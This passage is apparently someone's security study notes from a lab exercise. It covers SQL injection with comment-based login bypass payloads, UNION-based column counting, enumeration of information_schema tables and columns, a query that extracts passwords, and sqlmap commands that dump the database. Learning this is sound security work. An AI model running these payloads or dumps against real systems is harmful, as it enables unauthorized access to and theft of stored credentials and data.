- Using comments
	- `jeremy' or 1=1#`
	- `jeremy' OR 1=1-- -`
# Using Union
---
- Only works when ==**both sides have equal columns in selection with same data type**==
- Can use `NULL(int)` for **type cast**
  
- **Detecting number of columns from first query**
---
- Try **adding `NULL` until we get some records** (null matches with every data type) 
	- `jeremy' UNION select NULL,NULL,NULL#
		![[Pasted image 20250405155557.png]]
	- Even though we see only 2 columns (name and email), in **==backend there can be more columns.==**

- **Getting useful information**
---
- `jeremy' UNION select NULL,NULL,version()#` -> DB version
- `jeremy' UNION select NULL,NULL,table_name from information_schema.tables#` -> All tables
- `jeremy' UNION select NULL,NULL,column_name from information_schema.columns#`-> All columns
- `jeremy' UNION SELECT NULL, table_name, NULL FROM information_schema.columns WHERE column_name='username'#` -> **get table name from column name**

- Getting password:
	- `jeremy' UNION select NULL,NULL,password from injection0x01#`
	- ![[Pasted image 20250405160232.png]]


# SQLMap
---
![[Pasted image 20250406032324.png]]
![[Pasted image 20250406032355.png]]
- `sqlmap -r request.txt --level=2`
- ![[Pasted image 20250406032855.png]]


- Let's dump everything using:
	- `sqlmap -r request.txt --level=2 --dump`
	- ![[Pasted image 20250406033307.png]]
	- ![[Pasted image 20250406033344.png]]
	- ![[Pasted image 20250406033406.png]]
	- Specify table name using:
- ---
        ![[Pasted image 20250406033735.png]]